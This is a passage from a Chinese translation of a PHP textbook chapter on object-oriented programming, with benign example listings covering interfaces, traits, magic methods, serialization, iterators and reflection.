    return "Computer starts in " . $this->sek;
}
}

$MyComputer = new Computer("15 seconds");
echo $MyComputer->start();
?>
```

清单 11.22 "readonly" 属性（"readonly.php"）

> 注意
> 自 PHP 8.2 起，readonly 属性也可用于类。这意味着类的所有属性都是只读的，并且只能通过构造函数设置。

### 11.3.5 接口

_接口_ 表示类的模板。它声明方法但不提供实现：

```
interface Bootmanager {
    function start();
}
```

这些方法现在可以在类中实现。为此使用 implements 关键字。然后在类中为方法赋予生命或功能。

```
class Computer implements Bootmanager {
    function start() {
        return "Computer is started";
    }
}
```

清单 11.23 接口（摘自 "interfaces.php"）

> 注意
> 不能在接口中定义属性！

不过，接口不仅定义方法名，还定义方法接收的任何参数。如果类与接口之间存在差异，则会收到错误。

```
interface Bootmanager {
    function start($sek);
}
```

```
class Computer implements Bootmanager {
    function start($sek) {
        return "Computer starts in $sek";
    }
}
```

清单 11.24 接口中的参数（摘自 "interfaces_parameter.php"）

注意
由于 PHP 只是弱类型（即，无需定义数据类型），因此接口中定义的方法在类中不需要具有相同的返回值数据类型。然而，在强类型语言中，这通常是必需的。

接口的一个优点是，一个类可以实现多个接口。以下示例为 Computer 类和 Auto 类（包含所有电子设备！）使用了 Bootmanager 接口。另一方面，Formatter 接口定义了一个仅在 Computer 类中实现的方法。图 11.21 显示了输出。

```php
<?php
interface Bootmanager {
function start();
}
interface Formatter {
function format($drive);
}
class Computer implements Bootmanager, Formatter {
public function start() {
return "Computer is started";
}
public function format($drive): string {
return "Drive $drive is formatted";
}
}
class Car implements Bootmanager {
public function start() {
return "Car is started";
}
}
$MyComputer = new Computer();
echo $MyComputer->start() ."<br />";
echo $MyComputer->format("C")."<br />";
$MyCar = new Car();
echo $MyCar->start();
?>
```

清单 11.25 处理多个接口（"interfaces_multiple.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_331_0.png)

图 11.21 使用了各种方法

### 11.3.6 晚期静态绑定

如果使用 static 定义静态方法，则也可以在类的继承上下文中使用它们。以下示例展示了两个类：Computer 和 Laptop。Laptop 继承自 Computer。start() 方法仅在 Computer 中定义，并以静态方式调用。

start() 方法中会调用 class() 静态方法。通过 __CLASS__ 返回当前上下文中的类名。此方法在 Laptop 类中也存在。self:: 则直接访问调用所在的类。顺便说一句，对上级类的调用是通过 parent 进行的。

```php
<?php
class Computer {
public static function class() {
return __CLASS__;
}
public static function start() {
return self::class() . " is started.";
}
}
class Laptop extends Computer {
public static function class() {
return __CLASS__;
}
}
echo Laptop::start();
?>
```

清单 11.26 使用 "self" 的静态继承（"self.php"）

因此，此处的输出如下：

Computer is started.

晚期静态绑定定义了一个新关键字：static。事实上，该关键字本身并不新；它在这里仅用于澄清静态绑定。在继承情况下，它不指当前类，而是包含关于哪个类正在被调用的运行时信息——在此例中为 Laptop 类。运行时信息也是该过程被称为晚期静态绑定的原因。

考虑以下略作调整的示例。

```php
<?php
class Computer {
public static function class() {
return __CLASS__;
}
public static function start() {
return static::class() . " is started.";
}
}
class Laptop extends Computer {
public static function class() {
return __CLASS__;
}
}
echo Laptop::start();
?>
```

清单 11.27 使用 "static" 的静态继承（"staticbinding.php"）

此处的输出为：

Laptop is started.

## "static" 作为返回值

在 PHP 8 中，方法（或函数）还可以将静态类作为返回值。这意味着 static 也是一种类型声明。

只需在方法中将其指定为类型声明：

```
public static function class() : static {
return new static();
}
```

这里使用 static() 函数以确保静态方法实际返回静态类。

> 注意
> static 还可以与其他类型或 null 组合为联合类型（参见第 6 章），例如 ?static 或 static|array。

以下清单显示了完整脚本。

```php
<?php
class Computer {
    public static function class() : static {
        return new static();
    }

    public static function start() : string {
        return get_class(static::class()) . " is started.";
    }
}

class Laptop extends Computer {
    public static function class() : static {
        return new static();
    }
}

echo Laptop::start();

?>
```

清单 11.28 使用 "static" 的返回类型（"static_return.php"）

输出返回被调用类的名称及附加字符串：

Laptop is started.

### 11.3.7 抽象类

抽象类和方法与接口非常相似。在这里，抽象方法不会在抽象类中实现，而只是被指定。抽象类本身无法实例化。方法仅在使用抽象类的类中实现。

```php
<?php
abstract class Computer {
    abstract function start();
}

class Laptop extends Computer {
    public function start() {
        return "Laptop is started";
    }
}

$MyLaptop = new Laptop();

echo $MyLaptop->start();

?>
```

清单 11.29 抽象类（"abstract.php"）





前面的脚本因此输出以下内容：

笔记本电脑已启动

但是，与接口不同，抽象类不能实现标记为抽象的方法，这些方法随后由可实例化的继承类使用。

即使使用抽象类，抽象方法的参数也必须与实现方法的参数相同。但是，包含额外的可选参数是可行的。

```php
abstract class Computer {
abstract function start($sek);
}
class Laptop extends Computer {
public function start($sek) {
return "Laptop will start in $sek";
}
}
```

清单 11.30 带有一个参数的抽象类（摘自 "abstract_parameter.php"）

抽象类受以下限制：

- 无法从抽象类实例化对象。
- 一个类不能同时继承多个抽象类。这一限制主要适用于接口，在这方面接口更加灵活。
- 方法不能声明为 `private`，因为它们必须被继承，也不能声明为 `final`，因为它们会被重写。
- 还有一个至少部分的限制：虽然可以在抽象类中定义属性，但无法创建对继承类具有强制性的抽象属性。
- 在 PHP 7.2 中，另一项限制被解除。从这个版本起，相互继承的抽象类中的方法可以相互覆盖。

### 11.3.8 匿名类

匿名类是 PHP 7 中的新功能，当需要将类作为结构但不希望多次使用时使用。这类类的一个常见应用领域例如是：函数或方法期望将类作为参数的情况。

匿名类只需使用 `new class` 即可定义，无需类名。随后可以在类中定义属性和方法，并可通过变量或参数轻松访问该类本身。

```php
<?php
$class = new class {
    public function shutdown($seconds) {
        echo "Computer will shut down in $seconds seconds";
    }
};

$class->shutdown(10);
?>
```

清单 11.31 简单的匿名类（"anonymous_classes.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_335_0.png)

图 11.22 匿名类的行为类似于“普通”类

不过，匿名类还可以做更多事情。它可以通过构造函数接受参数，可以继承自其他类，可以实现接口，并可以使用 trait。

以下示例展示了继承以及构造函数的参数。

```php
<?php
class Computer {
    protected $display;
}

$class = new class('15 inch') extends Computer {
    public function __construct($display) {
        $this->display = $display;
    }

    public function getDisplay() {
        return 'The display has ' . $this->display;
    }
};

echo $class->getDisplay();
?>
```

清单 11.32 带有继承和参数的匿名类（"anonymous_classes_inheritance.php"）

匿名类继承自 Computer 类，并使用声明为 `protected` 的 `$display` 属性。构造函数将传递给匿名类的 15 英寸参数值写入该属性。随后，返回值由 `getDisplay()` 方法处理（参见图 11.23）。该方法从存储匿名类对象的 `$class` 变量中调用。

![](img/ae7820c36e8f24c1623d26668b28e80e_336_0.png)

图 11.23 匿名类通过方法返回原始传递的参数值

### 11.3.9 常量

常量在第 4 章中应该很熟悉。在 PHP 中，类内部也有常量。使用 `const` 关键字定义这些常量，然后通过双冒号 `(::)` 访问它们。这在类内部和外部都适用。

```php
<?php
class Computer {
const sec = "15 seconds";
public function start() {
return "Computer starts in " . Computer::sec;
}
}
$MyComputer = new Computer();
echo $MyComputer->start() ."<br />";
echo "And again in " . Computer::sec;
?>
```

清单 11.33 类中的常量（"constants.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_336_1.png)

图 11.24 访问类内外的常量

### 常量的可见性和类型

常量也可以具有 `public`、`private` 等可见性。自 PHP 8.3 起，还可以为常量指定数据类型。

在以下示例中，常量被定义为 `public` 且为字符串类型。

```php
<?php
class Computer {
public const string sec = "15 seconds";
public function start() {
return "Computer starts in " . Computer::sec;
}
}
$MyComputer = new Computer();
echo $MyComputer->start() ."<br />";
echo "And again in " . Computer::sec;
?>
```

清单 11.34 常量的可见性和类型（"constants_typed.php"）

输出与上一部分相同。

> 注意
> 自 PHP 8.1 起，还可以为常量提供 `final`。

### 11.3.10 重载

方法重载是指方法接收的参数多于指定数量，或参数的数据类型不同。这意味着会传递方法无法预知的值。重载是一种非常实用的编程技术，因为一个方法可以处理通常需要多个方法才能处理的不同情况。

这里将简要总结重载技术。函数的已知选项如下：

- 参数的默认值
- 使用 `...` 运算符（参见图 11.25）

```php
<?php
class Computer {
public function drives(...$drives) {
echo "Drives:<br />";
foreach ($drives as $drive) {
echo $drive ."<br />";
}
}
}
$MyComputer = new Computer();
$MyComputer->drives("C", "D");
$MyComputer->drives("C", "D", "E");
?>
```

清单 11.35 使用运算符的重载（"overload_functions.php"）

使用函数读取运算符——这也适用于方法。

```php
<?php
class Computer {
public function drives() {
$drives = func_get_args();
echo "Drives:<br />";
foreach ($drives as $drive) {
echo $drive ."<br />";
}
}
}
$MyComputer = new Computer();
$MyComputer->drives("C", "D");
$MyComputer->drives("C", "D", "E");
?>
```

清单 11.36 使用函数的重载（"overload_functions_func_get_args.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_338_0.png)

图 11.25 函数对不同数量的参数做出反应

> **注意**
> PHP 不支持使用同名的多个方法进行重载，而这是许多人在其他面向对象语言中知道的做法。以下脚本在 Java 或 C# 中可以（类似地）工作，但在 PHP 中会返回错误，如图 11.26 所示：

```php
class Computer {
public function drives($a, $b) {
    return "The computer has the drives: $a and $b<br />";
}
public function drives($a, $b, $c) {
    return "The computer has the drives: $a, $b and $c<br />";
}
}
```

![](img/ae7820c36e8f24c1623d26668b28e80e_339_0.png)

图 11.26 在 PHP 中，使用同名方法的重载不起作用！

除了这些选项之外，PHP 中还有一些预定义方法可以简化重载。有关此内容的更多信息，请参阅后续章节。

## "__call()"

`__call(name, parameter)` 方法拦截类中未定义的所有方法（参见图 11.27）。它接收两个参数：被调用方法的名称及其参数数组。

```php
<?php
class Computer {
    public function __call($name, $parameter) {
        echo "Drives:<br />";
        foreach ($parameter as $element) {
            echo $element ."<br />";
        }
    }
}
$MyComputer = new Computer();
$MyComputer->drives("A", "B");
$MyComputer->drives("C", "D", "E");
?>
```

清单 11.37 `__call()`（"call.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_340_0.png)

图 11.27 使用 "__call()" 的重载

`__call()` 的一个缺点是它会拦截所有未定义的方法（参见图 11.28）。以下是示例：

```php
<?php
class Computer {
public function __call($name, $parameter) {
echo "Elements of function $name:<br />";
foreach ($parameter as $element) {
echo $element ."<br />";
}
}
}

$MyComputer = new Computer();
$MyComputer->fans("CPU", "Main");
$MyComputer->drives("C", "D", "E");
?>
```

清单 11.38 带有多个方法的 "__call()"（"call_multiple.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_340_1.png)

图 11.28 "__call()" 处理两个未定义的方法





如果你只想拦截一个方法，这总是不切实际的。在这种情况下，你必须使用一丝不太优雅的情况区分来检查方法的名称，如下示例所示。图 11.29 显示了结果。

```php
<?php
class Computer {
public function __call($name, $parameter) {
if ($name == "drives") {
echo "Drives:<br />";
foreach ($parameter as $element) {
echo $element ."<br />";
}
}
}
}
$MyComputer = new Computer();
$MyComputer->fans("CPU", "Main");
$MyComputer->drives("C", "D", "E");
?>
```

### 清单 11.39 使用情况区分检查方法名称 ("call_case.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_341_0.png)

### 图 11.29 仅处理 "drives()" 方法

### __get()

__get(name) 是 __call() 的对应方法，但用于属性。对于所有被读取但类中未提供或因可见性而无法访问的属性，该方法都会将属性名作为参数接收（参见图 11.30）。

```php
<?php
class Computer {
//public $CPU = "The CPU";
public function __get($property) {
echo("$property is not set");
}
}
$MyComputer = new Computer();
echo $MyComputer->CPU;
?>
```

### 清单 11.40 "__get()" ("get.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_342_0.png)

### 图 11.30 方法中未设置 "CPU" 属性

**提示**
在实践中，你主要需要此方法来拦截不会导致错误消息的属性调用。

### __set()

__set(name, value) 将未定义属性的名称和要设置的值作为参数接收。当然，你可以指示无法指定该值，因为属性未提供——但也可以直接设置属性并赋予其值。在这种情况下，类本身需要一个属性 #[AllowDynamicProperties]。否则，属性的动态创建已被弃用。其原因是，如果属性的动态创建文档不完善，会导致代码更难以理解。

```php
<?php
#[AllowDynamicProperties] class Computer {
public function __get($property) {
echo("$property is not set");
}
public function __set($property, $value) {
$this->$property = $value; }
}
$MyComputer = new Computer();
$MyComputer->CPU = "4 GHZ";
echo $MyComputer->CPU;
?>
```

### 清单 11.41 "__set()" ("set.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_343_0.png)

### 图 11.31 动态设置属性

### 11.3.11 Traits

特性的目的是提供可重用的方法，而无需直接定义自己的类或类层次结构。特性的定义方式与类类似，使用 `trait` 关键字。其中定义了函数和（在实践中较为少见）属性：

```php
trait Converter {
private function mb2gb($mb) {
$gb = $mb / 1024;
return $gb;
}
}
```

然后可以在类中使用 `use` 关键字来使用此特性：

```php
class Computer {
use Converter;
}
```

> **注意**
> 
> 你也可以在类中使用多个特性。为此，只需在 `use` 关键字之后以逗号分隔的列表形式写出它们即可。

根据其可见性，该方法随后在类内部或外部可访问。以下清单包含完整代码，图 11.32 显示了输出。

```php
<?php
trait Converter {
private function mb2gb($mb) {
$gb = $mb / 1024;
return $gb;
}
}

class Computer {
use Converter;

public $RAM = "1024";
public function ramcheck() {
    $gb = $this->mb2gb($this->RAM);
    return "Computer has " . $gb . ' GB RAM';
}
}
class Laptop extends Computer {
    public $RAM = "4096";
}
$MyLaptop = new Laptop();
echo $MyLaptop->ramcheck();
?>
```

### 清单 11.42 使用特性 ("traits.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_344_0.png)

### 图 11.32 特性的方法提供适当的转换

> **注意**
> 如果在类结构中定义了同名的多个方法，则覆盖顺序如下：始终优先使用直接在相应类中定义的方法。其次是类中使用的特性。此排名的末尾是继承类中的方法。

特性中的方法可以相当灵活地使用，既可以更改名称，也可以更改可见性。前者在类中可能存在多个特性或方法的名称冲突时尤其必要。

要更改名称和可见性，有两个关键字放置在 use 语句后面的花括号中；如果有两个具有相同方法的特性，则 instead of 决定应使用哪个特性。as 允许为方法指定别名（不同名称）并更改可见性——或者仅执行其中之一。

以下示例展示了两个具有相同 `mb2gb()` 方法的特性。在 `Computer` 类中，指定对相同方法使用 `converter` 特性中的方法。此外，可见性提高到 `protected`，以便该方法可以在继承类 `Laptop` 中使用。我们将 `Helpers` 特性中同名的方法设置为公开可访问，并分配 `convertRam()` 别名。图 11.33 显示了输出。

```php
<?php
trait Converter {
    private function mb2gb($mb) {
        $gb = $mb / 1024;
        return $gb;
    }
}

trait Helpers {
    private function mb2gb($mb) {
        $gb = $mb / 1024;
        return $gb . " Gigabyte";
    }
}

class Computer {
    use Converter, Helpers
    {
        Converter::mb2gb insteadof Helpers;
        Converter::mb2gb as protected;
        Helpers::mb2gb as public convertRam;
    }

    public $RAM = "1024";
}

class Laptop extends Computer {
    public $RAM = "4096";
    public function ramcheck() {
        $gb = $this->mb2gb($this->RAM);
        return "Computer has " . $gb . ' GB RAM';
    }
}

$MyLaptop = new Laptop();
echo $MyLaptop->ramcheck() . '<br />';
echo $MyLaptop->convertRam('2048');
?>
```

### 清单 11.43 具有同名方法的特性 ("traits_methods_change.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_345_0.png)

### 图 11.33 输出由两个特性方法控制

## 11.4 有用信息

### 11.4.1 错误级别

PHP 中一个有用的选项是设置错误拦截。但需要知道的是，错误级别（基本错误类型）在 PHP 中经常发生变化。

在 PHP 5.0 中，出现了新的 E_STRICT 错误级别。但最初它未包含在 E_ALL 中。随后在 PHP 5.4 中将其“集成”到 E_ALL 中，因此 E_STRICT 错误也会在 E_ALL 级别下抛出。在 PHP 7 中，E_STRICT 又被完全移除，相应错误被拆分到其他错误级别。自 PHP 8 起，E_ALL 一直是标准。

以下示例也展示了随时间的变化。在 PHP 5.3 中，添加了一个新错误级别：E_DEPRECATED。它主要旨在支持现代化。这意味着会输出所有针对官方不再推荐的函数的错误。OOP 中的一个示例是 call_user_method()。与所有错误级别一样，E_DEPRECATED 可以在 php.ini 级别或脚本文件级别创建。该示例针对 PHP 5.3 使用 error_reporting() 函数将错误级别设置为最高级别。

```php
<?php
error_reporting(E_ALL | E_STRICT);
class Computer {
    public function shutdown($seconds) {
        echo "Computer will shut down in $seconds seconds";
    }
}

$duration = 12;
$MyComputer = new Computer();

call_user_method("shutdown", $MyComputer, $duration);
?>
```

### 清单 11.44 从 PHP 5.3 开始的错误级别 ("php53_error_level.php")

在 PHP 5.3 中，对 call_user_method() 的调用因此被称为 E_DEPRECATED，并作为相应错误输出（参见图 11.34）。自 PHP 7 起，此分配不再存在。因此，这里会发生“正常”错误——即致命错误——因为相应的过时方法已不再可用。





![](img/ae7820c36e8f24c1623d26668b28e80e_347_0.png)

图 11.34 带有 PHP 5.3（顶部）和 PHP 7（底部）的 "call_user_method()" 方法

> **提示**
> 无论版本如何，要获得最高错误级别，可以使用 error_reporting (-1)。-1 参数涵盖所有错误级别。自 PHP 5.4 起，E_ALL 的表现方式相同；也就是说，未来的错误级别也会自动考虑在内。

发生的任何错误都可以相对容易地使用 set_error_handler (函数名, 错误) 拦截。此函数的第一个参数指定处理程序的函数名。处理程序随后会以数字形式接收错误类型、错误字符串、错误文件以及发生错误的行。第二个参数是可选的，允许指定要拦截的错误级别——例如，此处为 E_WARNING。在下面的代码清单中，你会捕获所有 E_WARNING 错误并让其他错误通过。图 11.35 显示了一个结果。

```php
<?php
function error_handler($errno, $errstr, $errfile, $errline) {
    switch ($errno) {
        case E_WARNING:
            echo "WARNING: [$errno] $errstr<br />";
            break;
        default:
            echo "No E_WARNING error";
            break;
    }
    return true;
}
set_error_handler("error_handler", E_WARNING);
```

```php
class Computer {
}

$MyComputer = new Computer();
$MyComputer->display();
?>
```

代码清单 11.45 捕获错误 ("error_level_catch.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_348_0.png)

图 11.35 自己捕获错误

> **注意**
> 使用 set_error_handler() 捕获错误对于致命错误、核心错误和解析错误无效。

### 11.4.2 "spl_autoload_register()"

spl_autoload_register(function) 注册一个函数，用于响应对当前不可用的类的所有调用。然后你可以相应地进行响应。

```php
<?php
function autoloader($class) {
    echo "The class $class does not exist!";
}

spl_autoload_register('autoloader');
$MyComputer = new Computer();
?>
```

代码清单 11.46 "spl_autoload_register()" ("spl_autoload_register.php")

注意：PHP 解释器也会抛出错误，你只能通过非常严格（通常过于严格）的错误管理来抑制它。然而，在 spl_autoload_register() 的一个常见应用中，这种行为无关紧要——即当你使用它来加载外部类时。这可能如下示例所示（另见图 11.36）。

```php
<?php
function autoloader($class) {
    include $class . ".php";
}

spl_autoload_register('autoloader');
$MyComputer = new Computer();
$MyComputer->start();
?>
```

代码清单 11.47 带有外部文件的 "spl_autoload_register_external" ("spl_autoload_register_external.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_349_0.png)

图 11.36 "__autoload()" 拦截类调用

> **提示**
> `spl_autoload_register()` 的一个较旧替代方案是 `__autoload()`。它不像 `spl_autoload_register()` 那样可以多次使用，且灵活性较低。它已随 PHP 8 被移除。

### 11.4.3 "__METHOD__"

__METHOD__ 是 PHP 预定义的一个常量。它输出调用它时所在的当前方法。在输出中，类名用两个冒号与方法名分隔（见图 11.37）。__METHOD__ 也被称为 *魔术常量*，因为其值自然取决于上下文。与真正的常量不同，__METHOD__ 根据其所在的方法提供不同的值。

```php
<?php
class Computer {
    public function start() {
        echo "This is the method " . __METHOD__;
    }
}
$MyComputer = new Computer();
$MyComputer->start();
?>
```

代码清单 11.48 读取当前方法 ("method.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_350_0.png)

图 11.37 显示类名和方法名

> **注意**
> 如果 __METHOD__ 位于函数中而非方法中，则仅显示函数（见图 11.38）。不过，为此也有 __FUNCTION__。

![](img/ae7820c36e8f24c1623d26668b28e80e_350_1.png)

图 11.38 函数中的 "__METHOD__"

> **提示**
> PHP 还提供其他魔术常量。__FILE__ 返回当前脚本文件的名称和位置，__LINE__ 返回文件中相应的行号。

### 11.4.4 "__toString()"

当对象被显式转换为字符串时，会使用 __toString() 方法。这种显式转换是在对象名称前加上 (string) 进行的：

```
(string) $object;
```

顺便说一句，此转换的返回值是之前的数据类型（即对象）以及对象的签名或编号。

转换后，访问对象只会返回 __toString() 方法。请看下面的简单示例；输出结果见图 11.39。

```php
<?php
class Computer {
    public function __toString() {
        return "The output for the method as a string";
    }
}

$MyComputer = new Computer();
echo(string) $MyComputer ."<br />";
echo $MyComputer;
?>
```

代码清单 11.49 "__toString()" ("toString.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_351_0.png)

图 11.39 顶部显示对象签名，底部显示转换为字符串的对象的返回值

### 11.4.5 类类型和 "instanceof"

一个有趣且实用的问题是对象通常属于哪个类（或哪个接口）。在 PHP 中，有两种方法可以确保只允许特定类。一种是在相应值之前写出类类型。

在下面的示例中，只能将一个 Computer 类的对象作为参数传递给 change() 函数。如果不这样做——就像本例中那样——则会显示一条错误消息（见图 11.40）。

```php
<?php
class Computer {
    public $CPU = "The CPU";
}

class Car {
    public $Wheels = 4;
}

function change(Computer $Object) {
    $Object->CPU = "4 GHZ";
}
$MyCar = new Car();
change($MyCar);
?>
```

代码清单 11.50 对象类型化 ("class_types.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_352_0.png)

图 11.40 该类是 "Car" 的实例，而不是 "Computer" 的实例

> **注意**
> 类名技术在使用严格类型的面向对象语言中很重要。另一方面，PHP 是弱类型语言；也就是说，你不必指定任何数据类型。因此，指定类类型是一种例外。符合 PHP 架构，检查仅在执行脚本时（运行时）进行。

指定类类型时显示的错误消息并不总是可取。出于这个原因，有一个关键字可以确定对象是否是某个类的实例：instanceof。语法如下：

Object instanceof class

此结构的返回值是一个布尔值。使用 instanceof 运算符，你可以快速使用类类型重写脚本，只需检查传递给 change() 函数的对象是否来自 Computer 类，如下面的代码清单所示。当然，这为你提供了更多响应选项，但你也需要多敲一些代码。图 11.41 显示了输出。

```php
<?php
class Computer {
    public $CPU = "The CPU";
}
class Car {
    public $Wheels = 4;
}
function change($object) {
    if ($object instanceof Computer) {
        $object->CPU = "4 GHZ";
    } else {
        echo "Hoppsa, wrong class!";
    }
}
$MyCar = new Car();
change($MyCar);
?>
```

代码清单 11.51 检查实例 ("instanceof.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_353_0.png)

图 11.41 此处手动测试类

### 11.4.6 比较对象

在 PHP 中，对象也可以相互比较。使用相等运算符 (==) 进行比较时，如果对象属于同一类且具有相同的属性值，则返回 true。精确相等比较仅在它们是完全相同的对象时才返回 true。因此，类的两个实例永远不会完全相同。

```php
<?php
class Computer {
    public $CPU = "The CPU";
    public function start() {
        echo "Computer is started.";
    }
}
$MyComputer = new Computer();
$MyLaptop = new Computer();
```



```
echo $MyComputer == $MyLaptop;
echo '<br />';
echo $MyComputer === $MyLaptop;
echo '<br />';
$MyLaptop->CPU = "2.5 GHz Mobile";
echo $MyComputer == $MyLaptop;
?>
```

## 列表 11.52 对象互相比较 ("objects_compare.php")

在前面的示例中，第一个比较为真，因为两个对象属于同一类并且具有相同的 CPU 属性值。使用精确相等性的第二个比较为假，因为只有同一个实例才完全相同。只有

```
echo $MyComputer === $MyComputer;
```

因此会为真。

使用普通相等性的第三个比较不正确，因为其中一个实例的 CPU 属性已被更改。

> **注意**
>
> 如果将实例传递给函数和方法，在 PHP 中这是以引用方式进行的。因此，它仍然是同一个实例。对精确相等性的检查因此返回 true。另一方面，克隆的对象实例不再与原始实例 *完全相同*，而只是 *相同*。

### 11.4.7 序列化对象

尤其是在 Web 上，有时有必要发送信息或将其存储在 Cookie 中，例如。在大多数情况下，信息应以字符串形式提供。对象也可以转换为字符串。此过程称为 *序列化*。PHP 提供了两个用于序列化的函数：`serialize(object)` 和 `unserialize(string)`，用于将序列化转换回原始对象。

以下脚本说明了这两点：首先对对象进行序列化，然后输出序列化后的二进制代码，再将对象转换回另一个变量（参见图 11.42）。现在可以使用属性来访问对象的方法。当然，需要谨慎：只有在类存在时，这才是可能的！

```php
<?php
class Computer {
public $CPU = "The CPU";
public function start() {
    echo "Computer is started.";
}

}
$MyComputer = new Computer();
$serial = serialize($MyComputer);
echo $serial ."<br />";
$MyComputer2 = unserialize($serial);
$MyComputer2->start();

?>
```

## 列表 11.53 序列化对象 ("objects_serialize.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_355_0.png)

## 图 11.42 先序列化，再反序列化

> **注意**
>
> 如果可能，不应直接编辑序列化后的字符串。虽然通常可以读取并可能更改属性的值，但对二进制代码的任何小更改都会导致反序列化不正确。

### "__sleep()" 和 "__wakeup()"

使用预定义的 `__sleep()` 和 `__wakeup()` 方法，可以在序列化前后执行指令。`__sleep()` 函数还返回一个包含所有要保留属性的数组。默认情况下，会保留所有属性。例如，这里可以删除不希望包含在序列化数据中的属性，从而将其存储起来或通过网络传输。

请参考以下示例。

```php
<?php
class Computer {
public $CPU = "The CPU";
public $RAM = "Not used";
public function start() {
    echo "Computer is started.";
}
public function __sleep() {
    return array("CPU");
}

$MyComputer = new Computer();
$MyComputer->CPU = "4 GHz";
$MyComputer->RAM = "4 GB";
$serial = serialize($MyComputer);
$MyComputer2 = unserialize($serial);
echo $MyComputer2->CPU ."<br />";
echo $MyComputer2->RAM;

?>

```

## 列表 11.54 使用 "__sleep()" 序列化对象 ("objects_sleep.php")

CPU 属性会被保留并保持值 4 GHz。另一方面，RAM 不在数组中受到保护，因此会恢复为类中的值“未使用”（参见图 11.43）。

![](img/ae7820c36e8f24c1623d26668b28e80e_356_0.png)

## 图 11.43 保留了 CPU，但工作内存的信息未被保留

__wakeup() 方法是 __sleep() 的对应方法。例如，这里可以为未保存的属性分配新值（参见图 11.44）或重新建立数据库连接。

```php
class Computer {
public $CPU = "The CPU";
public $RAM = "Not used";
public function start() {
echo "Computer is started.";
}
public function __sleep() {
return array("CPU");
}
public function __wakeup() {
$this->RAM = "2 GB";
}
}

```

## 列表 11.55 "__wakeup()" ("objects_wakeup.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_357_0.png)

## 图 11.44 "__wakeup()" 为 "RAM" 属性定义新值

### 11.4.8 对象的自动读取

可以自动读取对象的属性。最佳方法是使用 foreach 循环。它遍历对象的所有属性并返回它们的值。其基本语法如下：

```
foreach (object as value) {
statements;
}
```

在实际中，整体情况如下：foreach 循环遍历所有属性。将值保存在 $value 变量中，然后在循环内输出这些值（参见图 11.45）。

```php
<?php
class Computer {
public $CPU = "The CPU";
public $RAM = 1024;
}
$MyComputer = new Computer();
foreach ($MyComputer as $value) {
echo $value ."<br />";
}
?>
```

## 列表 11.56 "foreach" ("objects_read.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_357_1.png)

## 图 11.45 属性的两个值

## 属性名和属性值

如果想要获取属性的名称和值，需要稍微调整循环的语法：

```
foreach (object as name => value) {
    statements;
}
```

请参考以下示例。图 11.46 显示输出。

```php
<?php
class Computer {
    public $CPU = "The CPU";
    public $RAM = 1024;
}
$MyComputer = new Computer();
foreach ($MyComputer as $name => $value) {
    echo "The property $name has the value: $value <br />";
}
?>
```

## 列表 11.57 属性的名称和值 ("objects_read_name.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_358_0.png)

## 图 11.46 显示属性的名称和值

### 11.4.9 迭代

无论是数据库结果、数组、文件还是会话变量，所有这些用例都需要遍历较长的结果列表。程序员可以理解地希望标准化此过程，该过程也称为 *迭代*，因为一次迭代可用于不同任务。这就是为什么在 PHP 中实现了 `Iterator` 和 `IteratorAggregate` 接口。其工作原理如下：

- `IteratorAggregate` 仅定义一个方法 `getIterator()`，该方法返回一个迭代器对象。此接口在包含要迭代元素的类中实现。
- `Iterator` 拥有自己的类，该类具有一些固定方法。然后必须对这些方法的功能进行编程。
- 构造函数通常接收要遍历的元素并将其保存在属性中。
- current() 返回当前正在遍历的部分元素的值。
- next() 跳转到下一个子元素。
- rewind() 跳转到第一个子元素。
- key() 返回当前子元素的键，该键通常也存储在属性中。
- valid() 确定是否仍存在部分元素。

以下示例是遍历数组的实际实现。图 11.47 显示其输出。

```php
<?php
class DriveIterator implements Iterator {
private $Target;
private $Index;
function __construct($Target) {
$this->Target = $Target;
}

function current(): mixed {
return $this->Target[$this->Index];
}

function next(): void {
$this->Index++;
}

function rewind(): void {
$this->Index = 0;
}

function key(): int {
return $this->Index;
}

function valid(): bool {
return $this->Index < count($this->Target); //maximum quantity
}
}
class Computer implements IteratorAggregate {
public $Drives = array("A", "B", "C");

function getIterator(): DriveIterator {
    return new DriveIterator($this->Drives);
}
}
$MyComputer = new Computer();
$i = $MyComputer->getIterator();
for ($i->rewind(); $i->valid(); $i->next()) {
    echo "Index: " . $i->key() . "<br />";
    echo "Value: " . $i->current() . "<br />";
}
?>
```

## 列表 11.58 迭代 ("objects_read_iteration.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_360_0.png)

## 图 11.47 迭代器遍历数组

## 11.4.10 反射 API

反射存在于某些面向对象编程语言中。它最简单的翻译是“照镜子”。反射 API 由一系列类组成，用于更仔细地检查类、方法和属性——也就是说，对它们“照镜子”并重用结果。这是在运行时完成的，因此可以直接在代码中对结果做出反应。

要访问反射 API，请创建相应反射类的对象，例如，对于属性使用 ReflectionProperty。然后可以使用该类的方法。在以下示例中，我们使用 getValue() 方法：

```php
$MyComputer = new Computer();
$refProp = new ReflectionProperty("Computer", "cpu");
echo $refProp->getValue($MyComputer);
```

使用 ReflectionClass 的另一种方式是，然后访问一个方法：



```php
class Computer {
    private $cpu = "The CPU";
    public function setCPU($cpu) {
        echo 'The computer has ' . $cpu;
    }
}

$refClass = new ReflectionClass('Computer');
$computer = new Computer();
$method = $refClass->getMethod('setCPU');
echo $method;
echo '<br />';
$method->invoke($computer, '4 CPUs');
?>
```

代码清单 11.59 “ReflectionClass” 的使用（"reflection_object.php"）

这里，通过反射类执行并检查一个方法。`invoke()` 方法用于执行。还有 `invokeArgs(Object, Array)`，可用于以数组形式传递多个参数（参见图 11.48）。

![](img/ae7820c36e8f24c1623d26668b28e80e_361_0.png)

